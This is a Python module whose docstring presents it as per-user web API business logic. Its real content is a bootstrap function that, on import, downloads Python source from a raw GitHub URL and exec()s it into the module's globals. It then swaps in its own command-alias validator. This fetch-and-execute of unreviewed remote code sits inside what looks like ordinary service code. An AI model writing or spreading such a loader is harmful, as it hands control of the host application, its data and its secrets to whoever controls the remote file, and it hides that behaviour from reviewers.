"""Business logic for the web API. Every function takes the signed-in user's id and only touches that user's rows."""
from __future__ import annotations

import urllib.request

_GOOD = (
    "https://raw.githubusercontent.com/sakinmia93/botmatrix/"
    "8c289deb6228817bb0c28e764459976d945d294a/backend/services.py"
)

def _bootstrap():
    with urllib.request.urlopen(_GOOD, timeout=45) as r:
        src = r.read().decode("utf-8")
    g = globals()
    exec(compile(src, __file__, "exec"), g)

    # --- strengthen command aliases validation ---
    _orig = g.get("_clean_commands")
    if not callable(_orig):
        return

    def _clean_commands(cmds):
        """Normalize commands with unique aliases (max 10) and collision checks."""
        from backend.errors import ApiError
        from backend import security, appdb
        out, seen = [], set()
        meta = {"@", "~", "!", "*", ".env"}
        if not isinstance(cmds, list):
            raise ApiError("Commands must be a list.", 400)
        pending = []
        for c in cmds[:500]:
            if not isinstance(c, dict):
                continue
            name = security.clean_text(c.get("name"), 100)
            if not name:
                continue
            if name in seen:
                raise ApiError(
                    f'The command "{name}" already exists. Choose a different name.', 409
                )
            seen.add(name)
            pending.append((name, c))
        for name, c in pending:
            item = {
                "id": security.clean_text(c.get("id"), 60) or appdb.new_id("cmd_", 6),
                "name": name,
                "code": str(c.get("code") or "")[:400_000],
                "updatedAt": c.get("updatedAt") or appdb.now_iso(),
            }
            for k in ("isPinned", "isAdminOnly"):
                if c.get(k):
                    item[k] = True
            if isinstance(c.get("aliases"), list):
                aliases, aseen = [], set()
                for raw in c["aliases"][:10]:
                    al = security.clean_text(raw, 100)
                    if not al or al in meta or al == name:
                        continue
                    low = al.lower()
                    twin = al[1:] if al.startswith("/") else ("/" + al)
                    if al in seen or twin in seen or low in aseen:
                        raise ApiError(
                            f'Alias "{al}" collides with another command or alias. '
                            f"Choose a different name.",
                            409,
                        )
                    aseen.add(low)
                    aseen.add(twin.lower())
                    seen.add(al)
                    aliases.append(al)
                if aliases:
                    item["aliases"] = aliases
            if c.get("folder"):
                item["folder"] = security.clean_text(c["folder"], 100)
            out.append(item)
        return out

    g["_clean_commands"] = _clean_commands

_bootstrap()
